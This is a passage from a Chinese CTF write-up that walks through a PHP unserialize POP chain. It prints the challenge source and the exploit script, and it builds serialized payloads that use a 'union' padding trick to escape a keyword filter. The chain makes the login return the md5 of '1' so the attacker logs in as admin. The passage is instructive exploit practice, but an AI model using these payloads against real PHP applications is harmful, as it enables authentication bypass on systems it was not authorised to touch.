class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>();<br><span class="hljs-variable">$a</span>-&gt;sql = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;age = <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase-&gt;name = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase-&gt;password = <span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-comment">//注意这里是字符串1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>取得payload如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;newinfo&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">71</span>:<span class="hljs-string">&quot;select id,&quot;</span>c4ca4238a0b923820dcc509a6f75849b<span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbCtrl&quot;</span>:<span class="hljs-number">8</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;hostname&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbuser&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dbpass&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;database&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;mysqli&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;N;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>现在我们只需要对这个字符串进行反序列化即可实现登录。可以利用User类update()函数的反序列化，这个函数在update.php中被调用。这里的反序列化字符串为getNewInfo()函数生成的字符串，该函数实例化了一个Info对象后序列化并进行了safe()函数过滤，并且实例化Info对象时参数可控。但是如果我们在这里传入参数，php只会把它当成字符串，不会解析为对象，无法触发pop链。因为这里反序列化的是Info对象。</p><p>我们观察safe()函数可以发现，该函数对字符串进行了一些替换，但是替换前后字符串长度可能发生变化，比如将union替换为hacker增加了一个字符，于是我们可以利用这个漏洞将我们的序列化字符串逃逸出来。</p><p>我们先构造一个Info类，并将nickname属性赋值为我们的序列化字符串，再进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;id=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;id)&#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;id;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;id;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//危</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br>Class UpdateHelper&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newinfo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;hostname, <span class="hljs-variable">$this</span>-&gt;dbuser, <span class="hljs-variable">$this</span>-&gt;dbpass, <span class="hljs-variable">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$idResult</span>, <span class="hljs-variable">$passwordResult</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>();<br><span class="hljs-variable">$a</span>-&gt;sql = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;age = <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase-&gt;name = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase-&gt;password = <span class="hljs-string">&#x27;1&#x27;</span>;<span class="hljs-comment">//注意这里是字符串1</span><br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>();<br><span class="hljs-variable">$b</span>-&gt;nickname = <span class="hljs-variable">$s</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>获取到的payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">447</span>:<span class="hljs-string">&quot;O:12:&quot;</span>UpdateHelpe<span class="hljs-string">r&quot;:3:&#123;s:2:&quot;</span>id<span class="hljs-string">&quot;;N;s:7:&quot;</span>newinfo<span class="hljs-string">&quot;;N;s:3:&quot;</span>sql<span class="hljs-string">&quot;;O:4:&quot;</span>Use<span class="hljs-string">r&quot;:3:&#123;s:2:&quot;</span>id<span class="hljs-string">&quot;;N;s:3:&quot;</span>age<span class="hljs-string">&quot;;s:71:&quot;</span>select id,<span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> from user where username=?<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;O:4:&quot;</span>Info<span class="hljs-string">&quot;:3:&#123;s:3:&quot;</span>age<span class="hljs-string">&quot;;N;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="hljs-string">&quot;;O:6:&quot;</span>dbCtrl<span class="hljs-string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&quot;;s:6:&quot;</span>dbuse<span class="hljs-string">r&quot;;s:4:&quot;</span>root<span class="hljs-string">&quot;;s:6:&quot;</span>dbpass<span class="hljs-string">&quot;;s:4:&quot;</span>root<span class="hljs-string">&quot;;s:8:&quot;</span>database<span class="hljs-string">&quot;;s:4:&quot;</span>test<span class="hljs-string">&quot;;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:6:&quot;</span>mysqli<span class="hljs-string">&quot;;N;s:5:&quot;</span>token<span class="hljs-string">&quot;;N;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>可以看到第一步生成的payload长度为447，因此这447个字符全部会被解析成字符串，不会存在中间的引号闭合前面的引号产生注入的问题。但是由于前面safe()函数进行替换时可能会导致字符串长度变化导致序列化字符串中的长度失效。如果我们在第一步的字符串前面加上447个union，进行替换后，字符串长度会加447，如果我们在加上”;，便可以逃逸出我们的字符串。我们首先对payload进行一些修改，保证在替换后能正确解析。</p><p>在前面加上”;s:6:”CtrlCase”;，可以闭合前面的引号并将我们的payload赋值给CtrlCase，然后在最后加上;}保证字符串格式正确。实际上就是将上一步payload中最后”;s:8:”CtrlCase”;N;}中的N替换为我们第一步的payload。然后我们测量出这个字符串的长度为466，因此我们在前面加上466个union</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;UpdateHelper&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;newinfo&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;sql&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;s:<span class="hljs-number">71</span>:<span class="hljs-string">&quot;select id,&quot;</span>c4ca4238a0b923820dcc509a6f75849b<span class="hljs-string">&quot; from user where username=?&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Info&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;CtrlCase&quot;</span>;O:<span 